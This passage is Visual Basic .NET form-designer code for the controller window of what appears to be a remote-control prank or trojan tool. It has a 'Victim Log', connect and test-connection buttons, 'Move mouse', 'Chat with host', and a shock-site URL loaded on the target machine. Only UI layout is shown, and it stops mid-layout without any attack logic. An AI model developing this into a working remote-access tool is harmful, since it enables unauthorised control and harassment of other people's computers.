Imports System.Net.Sockets
Imports System.Threading
Imports System.Net
Imports System.Text
Imports System.IO

Public Class Form1
    Inherits System.Windows.Forms.Form

#Region " Windows Form Designer generated code "

    Public Sub New()
        MyBase.New()

        'This call is required by the Windows Form Designer.
        InitializeComponent()

        'Add any initialization after the InitializeComponent() call

    End Sub

    'Form overrides dispose to clean up the component list.
    Protected Overloads Overrides Sub Dispose(ByVal disposing As Boolean)
        If disposing Then
            If Not (components Is Nothing) Then
                components.Dispose()
            End If
        End If
        MyBase.Dispose(disposing)
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    Friend WithEvents c As System.Windows.Forms.Button
    Friend WithEvents txt As System.Windows.Forms.TextBox
    Friend WithEvents cs As System.Windows.Forms.Button
    Friend WithEvents rt As System.Windows.Forms.ListBox
    Friend WithEvents ContextMenu1 As System.Windows.Forms.ContextMenu
    Friend WithEvents MenuItem1 As System.Windows.Forms.MenuItem
    Friend WithEvents MenuItem2 As System.Windows.Forms.MenuItem
    Friend WithEvents MenuItem3 As System.Windows.Forms.MenuItem
    Friend WithEvents MenuItem4 As System.Windows.Forms.MenuItem
    Friend WithEvents MenuItem5 As System.Windows.Forms.MenuItem
    Friend WithEvents MenuItem6 As System.Windows.Forms.MenuItem
    Friend WithEvents Button2 As System.Windows.Forms.Button
    Friend WithEvents Label1 As System.Windows.Forms.Label
    Friend WithEvents Label2 As System.Windows.Forms.Label
    Friend WithEvents ListBox1 As System.Windows.Forms.ListBox
    Friend WithEvents TabControl1 As System.Windows.Forms.TabControl
    Friend WithEvents TabPage1 As System.Windows.Forms.TabPage
    Friend WithEvents Button37 As System.Windows.Forms.Button
    Friend WithEvents GroupBox5 As System.Windows.Forms.GroupBox
    Friend WithEvents Button13 As System.Windows.Forms.Button
    Friend WithEvents GroupBox4 As System.Windows.Forms.GroupBox
    Friend WithEvents Button10 As System.Windows.Forms.Button
    Friend WithEvents Button9 As System.Windows.Forms.Button
    Friend WithEvents GroupBox3 As System.Windows.Forms.GroupBox
    Friend WithEvents Button8 As System.Windows.Forms.Button
    Friend WithEvents Button7 As System.Windows.Forms.Button
    Friend WithEvents GroupBox2 As System.Windows.Forms.GroupBox
    Friend WithEvents Button6 As System.Windows.Forms.Button
    Friend WithEvents Button5 As System.Windows.Forms.Button
    Friend WithEvents Button4 As System.Windows.Forms.Button
    Friend WithEvents Button3 As System.Windows.Forms.Button
    Friend WithEvents GroupBox1 As System.Windows.Forms.GroupBox
    Friend WithEvents Label3 As System.Windows.Forms.Label
    Friend WithEvents TextBox1 As System.Windows.Forms.TextBox
    Friend WithEvents TabPage2 As System.Windows.Forms.TabPage
    Friend WithEvents Button16 As System.Windows.Forms.Button
    Friend WithEvents Button15 As System.Windows.Forms.Button
    Friend WithEvents TextBox3 As System.Windows.Forms.TextBox
    Friend WithEvents Button17 As System.Windows.Forms.Button
    Friend WithEvents TabPage3 As System.Windows.Forms.TabPage
    Friend WithEvents GroupBox6 As System.Windows.Forms.GroupBox
    Friend WithEvents TextBox5 As System.Windows.Forms.TextBox
    Friend WithEvents Button32 As System.Windows.Forms.Button
    Friend WithEvents Button31 As System.Windows.Forms.Button
    Friend WithEvents Button30 As System.Windows.Forms.Button
    Friend WithEvents Button29 As System.Windows.Forms.Button
    Friend WithEvents Button28 As System.Windows.Forms.Button
    Friend WithEvents Button27 As System.Windows.Forms.Button
    Friend WithEvents Button26 As System.Windows.Forms.Button
    Friend WithEvents Button23 As System.Windows.Forms.Button
    Friend WithEvents Button22 As System.Windows.Forms.Button
    Friend WithEvents Button21 As System.Windows.Forms.Button
    Friend WithEvents Button20 As System.Windows.Forms.Button
    Friend WithEvents Button19 As System.Windows.Forms.Button
    Friend WithEvents Button18 As System.Windows.Forms.Button
    Friend WithEvents Label4 As System.Windows.Forms.Label
    Friend WithEvents Button24 As System.Windows.Forms.Button
    Friend WithEvents TextBox4 As System.Windows.Forms.TextBox
    Friend WithEvents TabPage4 As System.Windows.Forms.TabPage
    Friend WithEvents Button34 As System.Windows.Forms.Button
    Friend WithEvents TextBox6 As System.Windows.Forms.TextBox
    Friend WithEvents Button25 As System.Windows.Forms.Button
    Friend WithEvents Button38 As System.Windows.Forms.Button
    Friend WithEvents TabPage5 As System.Windows.Forms.TabPage
    Friend WithEvents Button1 As System.Windows.Forms.Button
    Friend WithEvents Button39 As System.Windows.Forms.Button
    Friend WithEvents TabPage6 As System.Windows.Forms.TabPage
    Friend WithEvents Button40 As System.Windows.Forms.Button
    Friend WithEvents TextBox2 As System.Windows.Forms.TextBox
    Friend WithEvents Button41 As System.Windows.Forms.Button
    Friend WithEvents Button42 As System.Windows.Forms.Button
    Friend WithEvents Button14 As System.Windows.Forms.Button
    Friend WithEvents PictureBox1 As System.Windows.Forms.PictureBox
    Friend WithEvents TabPage7 As System.Windows.Forms.TabPage
    Friend WithEvents Label5 As System.Windows.Forms.Label
    Friend WithEvents Button43 As System.Windows.Forms.Button
    Friend WithEvents TabPage8 As System.Windows.Forms.TabPage
    Friend WithEvents Button44 As System.Windows.Forms.Button
    Friend WithEvents Button45 As System.Windows.Forms.Button
    Friend WithEvents Button36 As System.Windows.Forms.Button
    Friend WithEvents TextBox8 As System.Windows.Forms.TextBox
    Friend WithEvents GroupBox8 As System.Windows.Forms.GroupBox
    Friend WithEvents GroupBox7 As System.Windows.Forms.GroupBox
    Friend WithEvents Button48 As System.Windows.Forms.Button
    Friend WithEvents Button47 As System.Windows.Forms.Button
    Friend WithEvents Button46 As System.Windows.Forms.Button
    Friend WithEvents Button50 As System.Windows.Forms.Button
    Friend WithEvents Button49 As System.Windows.Forms.Button
    Friend WithEvents Button51 As System.Windows.Forms.Button
    Friend WithEvents Button53 As System.Windows.Forms.Button
    Friend WithEvents Button52 As System.Windows.Forms.Button
    Friend WithEvents GroupBox9 As System.Windows.Forms.GroupBox
    Friend WithEvents Button11 As System.Windows.Forms.Button
    Friend WithEvents TextBox9 As System.Windows.Forms.TextBox
    Friend WithEvents GroupBox10 As System.Windows.Forms.GroupBox
    Friend WithEvents TextBox10 As System.Windows.Forms.TextBox
    Friend WithEvents Button12 As System.Windows.Forms.Button
    Friend WithEvents Button33 As System.Windows.Forms.Button
    Friend WithEvents Button35 As System.Windows.Forms.Button
    Friend WithEvents Button56 As System.Windows.Forms.Button
    Friend WithEvents Button55 As System.Windows.Forms.Button
    Friend WithEvents Button54 As System.Windows.Forms.Button
    Friend WithEvents GroupBox11 As System.Windows.Forms.GroupBox
    Friend WithEvents Button59 As System.Windows.Forms.Button
    Friend WithEvents Button57 As System.Windows.Forms.Button
    Friend WithEvents Button60 As System.Windows.Forms.Button
    Friend WithEvents Button61 As System.Windows.Forms.Button
    Friend WithEvents Button62 As System.Windows.Forms.Button
    Friend WithEvents TextBox11 As System.Windows.Forms.TextBox
    Friend WithEvents Label7 As System.Windows.Forms.Label
    Friend WithEvents GroupBox12 As System.Windows.Forms.GroupBox
    Friend WithEvents Button63 As System.Windows.Forms.Button
    Friend WithEvents TextBox13 As System.Windows.Forms.TextBox
    Friend WithEvents TextBox12 As System.Windows.Forms.TextBox
    Friend WithEvents Label9 As System.Windows.Forms.Label
    Friend WithEvents Label8 As System.Windows.Forms.Label
    Friend WithEvents TextBox14 As System.Windows.Forms.TextBox
    Friend WithEvents TabPage9 As System.Windows.Forms.TabPage
    Friend WithEvents GroupBox13 As System.Windows.Forms.GroupBox
    Friend WithEvents Button69 As System.Windows.Forms.Button
    Friend WithEvents Button66 As System.Windows.Forms.Button
    Friend WithEvents Button65 As System.Windows.Forms.Button
    Friend WithEvents Button64 As System.Windows.Forms.Button
    Friend WithEvents Button67 As System.Windows.Forms.Button
    Friend WithEvents Button68 As System.Windows.Forms.Button
    Friend WithEvents Button70 As System.Windows.Forms.Button
    Friend WithEvents Button73 As System.Windows.Forms.Button
    Friend WithEvents Button72 As System.Windows.Forms.Button
    Friend WithEvents Button74 As System.Windows.Forms.Button
    Friend WithEvents ListBox3 As System.Windows.Forms.ListBox
    Friend WithEvents Button75 As System.Windows.Forms.Button
    Friend WithEvents ListBox4 As System.Windows.Forms.ListBox
    Friend WithEvents ListBox5 As System.Windows.Forms.ListBox
    Friend WithEvents ListBox2 As System.Windows.Forms.ListBox
    Friend WithEvents Button76 As System.Windows.Forms.Button
    Friend WithEvents Button77 As System.Windows.Forms.Button
    Friend WithEvents GroupBox14 As System.Windows.Forms.GroupBox
    Friend WithEvents Button78 As System.Windows.Forms.Button
    Friend WithEvents Button79 As System.Windows.Forms.Button
    Friend WithEvents Button71 As System.Windows.Forms.Button
    Friend WithEvents GroupBox15 As System.Windows.Forms.GroupBox
    Friend WithEvents Button82 As System.Windows.Forms.Button
    Friend WithEvents Button81 As System.Windows.Forms.Button
    Friend WithEvents Button58 As System.Windows.Forms.Button
    Friend WithEvents Button80 As System.Windows.Forms.Button
    Friend WithEvents Button83 As System.Windows.Forms.Button
    Friend WithEvents Button85 As System.Windows.Forms.Button
    Friend WithEvents Button84 As System.Windows.Forms.Button
    Friend WithEvents GroupBox16 As System.Windows.Forms.GroupBox
    Friend WithEvents Button87 As System.Windows.Forms.Button
    Friend WithEvents Button86 As System.Windows.Forms.Button
    Friend WithEvents GroupBox17 As System.Windows.Forms.GroupBox
    Friend WithEvents Label6 As System.Windows.Forms.Label
    Friend WithEvents Timer1 As System.Windows.Forms.Timer
    Friend WithEvents Button88 As System.Windows.Forms.Button
    Friend WithEvents Label12 As System.Windows.Forms.Label
    Friend WithEvents Label13 As System.Windows.Forms.Label
    Friend WithEvents Button91 As System.Windows.Forms.Button
    Friend WithEvents Button90 As System.Windows.Forms.Button
    Friend WithEvents GroupBox19 As System.Windows.Forms.GroupBox
    Friend WithEvents btnFavourites As System.Windows.Forms.Button
    Friend WithEvents btnClock As System.Windows.Forms.Button
    Friend WithEvents btnContents As System.Windows.Forms.Button
    Friend WithEvents btnGroup As System.Windows.Forms.Button
    Friend WithEvents btnTop As System.Windows.Forms.Button
    Friend WithEvents btnAutoHide As System.Windows.Forms.Button
    Friend WithEvents btnLock As System.Windows.Forms.Button
    Friend WithEvents GroupBox20 As System.Windows.Forms.GroupBox
    Friend WithEvents Button92 As System.Windows.Forms.Button
    Friend WithEvents TextBox17 As System.Windows.Forms.TextBox
    Friend WithEvents Label15 As System.Windows.Forms.Label
    Friend WithEvents TabPage10 As System.Windows.Forms.TabPage
    Friend WithEvents GroupBox18 As System.Windows.Forms.GroupBox
    Friend WithEvents Button89 As System.Windows.Forms.Button
    Friend WithEvents TextBox15 As System.Windows.Forms.TextBox
    Friend WithEvents TextBox7 As System.Windows.Forms.TextBox
    Friend WithEvents Label11 As System.Windows.Forms.Label
    Friend WithEvents Label10 As System.Windows.Forms.Label
    Friend WithEvents Button93 As System.Windows.Forms.Button
    Friend WithEvents GroupBox22 As System.Windows.Forms.GroupBox
    Friend WithEvents GroupBox21 As System.Windows.Forms.GroupBox
    Friend WithEvents Button95 As System.Windows.Forms.Button
    Friend WithEvents Button94 As System.Windows.Forms.Button
    Friend WithEvents MenuItem7 As System.Windows.Forms.MenuItem
    <System.Diagnostics.DebuggerStepThrough()> Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container
        Me.c = New System.Windows.Forms.Button
        Me.txt = New System.Windows.Forms.TextBox
        Me.cs = New System.Windows.Forms.Button
        Me.rt = New System.Windows.Forms.ListBox
        Me.ContextMenu1 = New System.Windows.Forms.ContextMenu
        Me.MenuItem4 = New System.Windows.Forms.MenuItem
        Me.MenuItem1 = New System.Windows.Forms.MenuItem
        Me.MenuItem2 = New System.Windows.Forms.MenuItem
        Me.MenuItem3 = New System.Windows.Forms.MenuItem
        Me.MenuItem5 = New System.Windows.Forms.MenuItem
        Me.MenuItem6 = New System.Windows.Forms.MenuItem
        Me.MenuItem7 = New System.Windows.Forms.MenuItem
        Me.Button2 = New System.Windows.Forms.Button
        Me.Label1 = New System.Windows.Forms.Label
        Me.Label2 = New System.Windows.Forms.Label
        Me.ListBox1 = New System.Windows.Forms.ListBox
        Me.TabControl1 = New System.Windows.Forms.TabControl
        Me.TabPage1 = New System.Windows.Forms.TabPage
        Me.GroupBox17 = New System.Windows.Forms.GroupBox
        Me.Label6 = New System.Windows.Forms.Label
        Me.GroupBox11 = New System.Windows.Forms.GroupBox
        Me.Button60 = New System.Windows.Forms.Button
        Me.Button59 = New System.Windows.Forms.Button
        Me.GroupBox10 = New System.Windows.Forms.GroupBox
        Me.TextBox10 = New System.Windows.Forms.TextBox
        Me.Button12 = New System.Windows.Forms.Button
        Me.GroupBox8 = New System.Windows.Forms.GroupBox
        Me.Button62 = New System.Windows.Forms.Button
        Me.TextBox1 = New System.Windows.Forms.TextBox
        Me.Label3 = New System.Windows.Forms.Label
        Me.GroupBox5 = New System.Windows.Forms.GroupBox
        Me.GroupBox12 = New System.Windows.Forms.GroupBox
        Me.Label9 = New System.Windows.Forms.Label
        Me.Label8 = New System.Windows.Forms.Label
        Me.Button63 = New System.Windows.Forms.Button
        Me.TextBox13 = New System.Windows.Forms.TextBox
        Me.TextBox12 = New System.Windows.Forms.TextBox
        Me.Button35 = New System.Windows.Forms.Button
        Me.GroupBox9 = New System.Windows.Forms.GroupBox
        Me.Button11 = New System.Windows.Forms.Button
        Me.TextBox9 = New System.Windows.Forms.TextBox
        Me.GroupBox7 = New System.Windows.Forms.GroupBox
        Me.Button70 = New System.Windows.Forms.Button
        Me.Button53 = New System.Windows.Forms.Button
        Me.Button52 = New System.Windows.Forms.Button
        Me.Button51 = New System.Windows.Forms.Button
        Me.Button50 = New System.Windows.Forms.Button
        Me.Button49 = New System.Windows.Forms.Button
        Me.Button48 = New System.Windows.Forms.Button
        Me.Button47 = New System.Windows.Forms.Button
        Me.Button46 = New System.Windows.Forms.Button
        Me.Button37 = New System.Windows.Forms.Button
        Me.Button13 = New System.Windows.Forms.Button
        Me.GroupBox3 = New System.Windows.Forms.GroupBox
        Me.Button8 = New System.Windows.Forms.Button
        Me.Button7 = New System.Windows.Forms.Button
        Me.GroupBox4 = New System.Windows.Forms.GroupBox
        Me.Button10 = New System.Windows.Forms.Button
        Me.Button9 = New System.Windows.Forms.Button
        Me.GroupBox2 = New System.Windows.Forms.GroupBox
        Me.Button6 = New System.Windows.Forms.Button
        Me.Button5 = New System.Windows.Forms.Button
        Me.Button4 = New System.Windows.Forms.Button
        Me.Button3 = New System.Windows.Forms.Button
        Me.GroupBox1 = New System.Windows.Forms.GroupBox
        Me.Label7 = New System.Windows.Forms.Label
        Me.TextBox11 = New System.Windows.Forms.TextBox
        Me.TabPage2 = New System.Windows.Forms.TabPage
        Me.Button39 = New System.Windows.Forms.Button
        Me.Button16 = New System.Windows.Forms.Button
        Me.Button15 = New System.Windows.Forms.Button
        Me.TextBox3 = New System.Windows.Forms.TextBox
        Me.Button17 = New System.Windows.Forms.Button
        Me.TabPage3 = New System.Windows.Forms.TabPage
        Me.Label12 = New System.Windows.Forms.Label
        Me.GroupBox6 = New System.Windows.Forms.GroupBox
        Me.TextBox5 = New System.Windows.Forms.TextBox
        Me.Button32 = New System.Windows.Forms.Button
        Me.Button31 = New System.Windows.Forms.Button
        Me.Button30 = New System.Windows.Forms.Button
        Me.Button29 = New System.Windows.Forms.Button
        Me.Button28 = New System.Windows.Forms.Button
        Me.Button27 = New System.Windows.Forms.Button
        Me.Button26 = New System.Windows.Forms.Button
        Me.Button23 = New System.Windows.Forms.Button
        Me.Button22 = New System.Windows.Forms.Button
        Me.Button21 = New System.Windows.Forms.Button
        Me.Button20 = New System.Windows.Forms.Button
        Me.Button19 = New System.Windows.Forms.Button
        Me.Button18 = New System.Windows.Forms.Button
        Me.Label4 = New System.Windows.Forms.Label
        Me.Button24 = New System.Windows.Forms.Button
        Me.TextBox4 = New System.Windows.Forms.TextBox
        Me.TabPage4 = New System.Windows.Forms.TabPage
        Me.Button74 = New System.Windows.Forms.Button
        Me.Button41 = New System.Windows.Forms.Button
        Me.Button1 = New System.Windows.Forms.Button
        Me.Button34 = New System.Windows.Forms.Button
        Me.TextBox6 = New System.Windows.Forms.TextBox
        Me.Button25 = New System.Windows.Forms.Button
        Me.Button38 = New System.Windows.Forms.Button
        Me.TabPage5 = New System.Windows.Forms.TabPage
        Me.Label13 = New System.Windows.Forms.Label
        Me.Button61 = New System.Windows.Forms.Button
        Me.Button42 = New System.Windows.Forms.Button
        Me.Button14 = New System.Windows.Forms.Button
        Me.PictureBox1 = New System.Windows.Forms.PictureBox
        Me.TabPage6 = New System.Windows.Forms.TabPage
        Me.Button33 = New System.Windows.Forms.Button
        Me.TextBox2 = New System.Windows.Forms.TextBox
        Me.Button40 = New System.Windows.Forms.Button
        Me.TabPage7 = New System.Windows.Forms.TabPage
        Me.GroupBox15 = New System.Windows.Forms.GroupBox
        Me.Button82 = New System.Windows.Forms.Button
        Me.Button81 = New System.Windows.Forms.Button
        Me.Button58 = New System.Windows.Forms.Button
        Me.Button80 = New System.Windows.Forms.Button
        Me.Button71 = New System.Windows.Forms.Button
        Me.ListBox5 = New System.Windows.Forms.ListBox
        Me.ListBox4 = New System.Windows.Forms.ListBox
        Me.Button75 = New System.Windows.Forms.Button
        Me.TextBox14 = New System.Windows.Forms.TextBox
        Me.Button57 = New System.Windows.Forms.Button
        Me.Button56 = New System.Windows.Forms.Button
        Me.Button55 = New System.Windows.Forms.Button
        Me.Button54 = New System.Windows.Forms.Button
        Me.Button43 = New System.Windows.Forms.Button
        Me.Label5 = New System.Windows.Forms.Label
        Me.ListBox2 = New System.Windows.Forms.ListBox
        Me.TabPage8 = New System.Windows.Forms.TabPage
        Me.Button91 = New System.Windows.Forms.Button
        Me.Button90 = New System.Windows.Forms.Button
        Me.ListBox3 = New System.Windows.Forms.ListBox
        Me.Button45 = New System.Windows.Forms.Button
        Me.Button36 = New System.Windows.Forms.Button
        Me.TextBox8 = New System.Windows.Forms.TextBox
        Me.Button44 = New System.Windows.Forms.Button
        Me.TabPage9 = New System.Windows.Forms.TabPage
        Me.GroupBox19 = New System.Windows.Forms.GroupBox
        Me.btnFavourites = New System.Windows.Forms.Button
        Me.btnClock = New System.Windows.Forms.Button
        Me.btnContents = New System.Windows.Forms.Button
        Me.btnGroup = New System.Windows.Forms.Button
        Me.btnTop = New System.Windows.Forms.Button
        Me.btnAutoHide = New System.Windows.Forms.Button
        Me.btnLock = New System.Windows.Forms.Button
        Me.GroupBox16 = New System.Windows.Forms.GroupBox
        Me.Button87 = New System.Windows.Forms.Button
        Me.Button86 = New System.Windows.Forms.Button
        Me.Button83 = New System.Windows.Forms.Button
        Me.GroupBox14 = New System.Windows.Forms.GroupBox
        Me.Button78 = New System.Windows.Forms.Button
        Me.Button85 = New System.Windows.Forms.Button
        Me.Button84 = New System.Windows.Forms.Button
        Me.Button79 = New System.Windows.Forms.Button
        Me.Button76 = New System.Windows.Forms.Button
        Me.Button77 = New System.Windows.Forms.Button
        Me.GroupBox13 = New System.Windows.Forms.GroupBox
        Me.Button73 = New System.Windows.Forms.Button
        Me.Button72 = New System.Windows.Forms.Button
        Me.Button69 = New System.Windows.Forms.Button
        Me.Button67 = New System.Windows.Forms.Button
        Me.Button66 = New System.Windows.Forms.Button
        Me.Button68 = New System.Windows.Forms.Button
        Me.Button65 = New System.Windows.Forms.Button
        Me.Button64 = New System.Windows.Forms.Button
        Me.Timer1 = New System.Windows.Forms.Timer(Me.components)
        Me.Button88 = New System.Windows.Forms.Button
        Me.GroupBox20 = New System.Windows.Forms.GroupBox
        Me.Button92 = New System.Windows.Forms.Button
        Me.TextBox17 = New System.Windows.Forms.TextBox
        Me.Label15 = New System.Windows.Forms.Label
        Me.TabPage10 = New System.Windows.Forms.TabPage
        Me.GroupBox18 = New System.Windows.Forms.GroupBox
        Me.Button89 = New System.Windows.Forms.Button
        Me.TextBox15 = New System.Windows.Forms.TextBox
        Me.TextBox7 = New System.Windows.Forms.TextBox
        Me.Label11 = New System.Windows.Forms.Label
        Me.Label10 = New System.Windows.Forms.Label
        Me.Button93 = New System.Windows.Forms.Button
        Me.Button94 = New System.Windows.Forms.Button
        Me.GroupBox21 = New System.Windows.Forms.GroupBox
        Me.GroupBox22 = New System.Windows.Forms.GroupBox
        Me.Button95 = New System.Windows.Forms.Button
        Me.TabControl1.SuspendLayout()
        Me.TabPage1.SuspendLayout()
        Me.GroupBox17.SuspendLayout()
        Me.GroupBox11.SuspendLayout()
        Me.GroupBox10.SuspendLayout()
        Me.GroupBox8.SuspendLayout()
        Me.GroupBox5.SuspendLayout()
        Me.GroupBox12.SuspendLayout()
        Me.GroupBox9.SuspendLayout()
        Me.GroupBox7.SuspendLayout()
        Me.GroupBox3.SuspendLayout()
        Me.GroupBox4.SuspendLayout()
        Me.GroupBox2.SuspendLayout()
        Me.GroupBox1.SuspendLayout()
        Me.TabPage2.SuspendLayout()
        Me.TabPage3.SuspendLayout()
        Me.GroupBox6.SuspendLayout()
        Me.TabPage4.SuspendLayout()
        Me.TabPage5.SuspendLayout()
        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.TabPage6.SuspendLayout()
        Me.TabPage7.SuspendLayout()
        Me.GroupBox15.SuspendLayout()
        Me.TabPage8.SuspendLayout()
        Me.TabPage9.SuspendLayout()
        Me.GroupBox19.SuspendLayout()
        Me.GroupBox16.SuspendLayout()
        Me.GroupBox14.SuspendLayout()
        Me.GroupBox13.SuspendLayout()
        Me.GroupBox20.SuspendLayout()
        Me.TabPage10.SuspendLayout()
        Me.GroupBox18.SuspendLayout()
        Me.GroupBox21.SuspendLayout()
        Me.GroupBox22.SuspendLayout()
        Me.SuspendLayout()
        '
        'c
        '
        Me.c.Location = New System.Drawing.Point(183, 11)
        Me.c.Name = "c"
        Me.c.Size = New System.Drawing.Size(56, 21)
        Me.c.TabIndex = 1
        Me.c.Text = "Connect"
        '
        'txt
        '
        Me.txt.Location = New System.Drawing.Point(19, 14)
        Me.txt.Name = "txt"
        Me.txt.Size = New System.Drawing.Size(158, 20)
        Me.txt.TabIndex = 5
        Me.txt.Text = "All your computer are belong to us."
        '
        'cs
        '
        Me.cs.Location = New System.Drawing.Point(185, 10)
        Me.cs.Name = "cs"
        Me.cs.Size = New System.Drawing.Size(56, 24)
        Me.cs.TabIndex = 6
        Me.cs.Text = "Send"
        '
        'rt
        '
        Me.rt.Location = New System.Drawing.Point(2, 360)
        Me.rt.Name = "rt"
        Me.rt.Size = New System.Drawing.Size(262, 134)
        Me.rt.TabIndex = 7
        '
        'ContextMenu1
        '
        Me.ContextMenu1.MenuItems.AddRange(New System.Windows.Forms.MenuItem() {Me.MenuItem4, Me.MenuItem1, Me.MenuItem2, Me.MenuItem3, Me.MenuItem5})
        '
        'MenuItem4
        '
        Me.MenuItem4.Index = 0
        Me.MenuItem4.Text = "Clear Chat Window"
        '
        'MenuItem1
        '
        Me.MenuItem1.Index = 1
        Me.MenuItem1.Text = "Change Nick"
        '
        'MenuItem2
        '
        Me.MenuItem2.Index = 2
        Me.MenuItem2.Text = "-"
        '
        'MenuItem3
        '
        Me.MenuItem3.Index = 3
        Me.MenuItem3.Text = "Disconnect"
        '
        'MenuItem5
        '
        Me.MenuItem5.Index = 4
        Me.MenuItem5.MenuItems.AddRange(New System.Windows.Forms.MenuItem() {Me.MenuItem6, Me.MenuItem7})
        Me.MenuItem5.Text = "Select Mode"
        '
        'MenuItem6
        '
        Me.MenuItem6.Index = 0
        Me.MenuItem6.Text = "Host"
        '
        'MenuItem7
        '
        Me.MenuItem7.Index = 1
        Me.MenuItem7.Text = "Connect"
        '
        'Button2
        '
        Me.Button2.Location = New System.Drawing.Point(245, 11)
        Me.Button2.Name = "Button2"
        Me.Button2.Size = New System.Drawing.Size(97, 21)
        Me.Button2.TabIndex = 9
        Me.Button2.Text = "Test connection"
        Me.Button2.UseVisualStyleBackColor = True
        '
        'Label1
        '
        Me.Label1.AutoSize = True
        Me.Label1.Location = New System.Drawing.Point(37, 344)
        Me.Label1.Name = "Label1"
        Me.Label1.Size = New System.Drawing.Size(56, 13)
        Me.Label1.TabIndex = 10
        Me.Label1.Text = "Victim Log"
        '
        'Label2
        '
        Me.Label2.AutoSize = True
        Me.Label2.Location = New System.Drawing.Point(367, 340)
        Me.Label2.Name = "Label2"
        Me.Label2.Size = New System.Drawing.Size(54, 13)
        Me.Label2.TabIndex = 12
        Me.Label2.Text = "Local Log"
        '
        'ListBox1
        '
        Me.ListBox1.Location = New System.Drawing.Point(299, 360)
        Me.ListBox1.Name = "ListBox1"
        Me.ListBox1.Size = New System.Drawing.Size(276, 108)
        Me.ListBox1.TabIndex = 11
        '
        'TabControl1
        '
        Me.TabControl1.Controls.Add(Me.TabPage1)
        Me.TabControl1.Controls.Add(Me.TabPage2)
        Me.TabControl1.Controls.Add(Me.TabPage3)
        Me.TabControl1.Controls.Add(Me.TabPage4)
        Me.TabControl1.Controls.Add(Me.TabPage5)
        Me.TabControl1.Controls.Add(Me.TabPage6)
        Me.TabControl1.Controls.Add(Me.TabPage7)
        Me.TabControl1.Controls.Add(Me.TabPage8)
        Me.TabControl1.Controls.Add(Me.TabPage9)
        Me.TabControl1.Controls.Add(Me.TabPage10)
        Me.TabControl1.Location = New System.Drawing.Point(2, 12)
        Me.TabControl1.Name = "TabControl1"
        Me.TabControl1.SelectedIndex = 0
        Me.TabControl1.Size = New System.Drawing.Size(599, 329)
        Me.TabControl1.TabIndex = 13
        '
        'TabPage1
        '
        Me.TabPage1.Controls.Add(Me.GroupBox17)
        Me.TabPage1.Controls.Add(Me.GroupBox11)
        Me.TabPage1.Controls.Add(Me.GroupBox10)
        Me.TabPage1.Controls.Add(Me.GroupBox8)
        Me.TabPage1.Controls.Add(Me.GroupBox5)
        Me.TabPage1.Controls.Add(Me.GroupBox4)
        Me.TabPage1.Controls.Add(Me.GroupBox2)
        Me.TabPage1.Controls.Add(Me.GroupBox1)
        Me.TabPage1.Location = New System.Drawing.Point(4, 22)
        Me.TabPage1.Name = "TabPage1"
        Me.TabPage1.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage1.Size = New System.Drawing.Size(591, 303)
        Me.TabPage1.TabIndex = 0
        Me.TabPage1.Text = "Main"
        Me.TabPage1.UseVisualStyleBackColor = True
        '
        'GroupBox17
        '
        Me.GroupBox17.Controls.Add(Me.Label6)
        Me.GroupBox17.Location = New System.Drawing.Point(459, 12)
        Me.GroupBox17.Name = "GroupBox17"
        Me.GroupBox17.Size = New System.Drawing.Size(103, 31)
        Me.GroupBox17.TabIndex = 14
        Me.GroupBox17.TabStop = False
        Me.GroupBox17.Text = "My IP"
        '
        'Label6
        '
        Me.Label6.AutoSize = True
        Me.Label6.Location = New System.Drawing.Point(10, 14)
        Me.Label6.Name = "Label6"
        Me.Label6.Size = New System.Drawing.Size(40, 13)
        Me.Label6.TabIndex = 0
        Me.Label6.Text = "0.0.0.0"
        '
        'GroupBox11
        '
        Me.GroupBox11.Controls.Add(Me.Button60)
        Me.GroupBox11.Controls.Add(Me.Button59)
        Me.GroupBox11.Location = New System.Drawing.Point(152, 151)
        Me.GroupBox11.Name = "GroupBox11"
        Me.GroupBox11.Size = New System.Drawing.Size(117, 67)
        Me.GroupBox11.TabIndex = 13
        Me.GroupBox11.TabStop = False
        '
        'Button60
        '
        Me.Button60.Enabled = False
        Me.Button60.Location = New System.Drawing.Point(7, 34)
        Me.Button60.Name = "Button60"
        Me.Button60.Size = New System.Drawing.Size(102, 22)
        Me.Button60.TabIndex = 4
        Me.Button60.Text = "Move mouse"
        Me.Button60.UseVisualStyleBackColor = True
        '
        'Button59
        '
        Me.Button59.Location = New System.Drawing.Point(7, 11)
        Me.Button59.Name = "Button59"
        Me.Button59.Size = New System.Drawing.Size(102, 22)
        Me.Button59.TabIndex = 3
        Me.Button59.Text = "Chat with host"
        Me.Button59.UseVisualStyleBackColor = True
        '
        'GroupBox10
        '
        Me.GroupBox10.Controls.Add(Me.TextBox10)
        Me.GroupBox10.Controls.Add(Me.Button12)
        Me.GroupBox10.Location = New System.Drawing.Point(23, 117)
        Me.GroupBox10.Name = "GroupBox10"
        Me.GroupBox10.Size = New System.Drawing.Size(247, 36)
        Me.GroupBox10.TabIndex = 7
        Me.GroupBox10.TabStop = False
        Me.GroupBox10.Text = "Load website"
        '
        'TextBox10
        '
        Me.TextBox10.Location = New System.Drawing.Point(19, 14)
        Me.TextBox10.Name = "TextBox10"
        Me.TextBox10.Size = New System.Drawing.Size(158, 20)
        Me.TextBox10.TabIndex = 5
        Me.TextBox10.Text = "www.meatspin.com"
        '
        'Button12
        '
        Me.Button12.Location = New System.Drawing.Point(185, 11)
        Me.Button12.Name = "Button12"
        Me.Button12.Size = New System.Drawing.Size(56, 24)
        Me.Button12.TabIndex = 6
        Me.Button12.Text = "Load"
        '
        'GroupBox8
        '
        Me.GroupBox8.Controls.Add(Me.Button62)
        Me.GroupBox8.Controls.Add(Me.TextBox1)
        Me.GroupBox8.Controls.Add(Me.Label3)
        Me.GroupBox8.Controls.Add(Me.c)
        Me.GroupBox8.Controls.Add(Me.Button2)
        Me.GroupBox8.Location = New System.Drawing.Point(23, 1)
        Me.GroupBox8.Name = "GroupBox8"
        Me.GroupBox8.Size = New System.Drawing.Size(428, 38)
        Me.GroupBox8.TabIndex = 12
        Me.GroupBox8.TabStop = False
        Me.GroupBox8.Text = "Connection"
        '
        'Button62
        '
        Me.Button62.Location = New System.Drawing.Point(349, 11)
        Me.Button62.Name = "Button62"
        Me.Button62.Size = New System.Drawing.Size(73, 21)
        Me.Button62.TabIndex = 10
        Me.Button62.Text = "Disconnect"
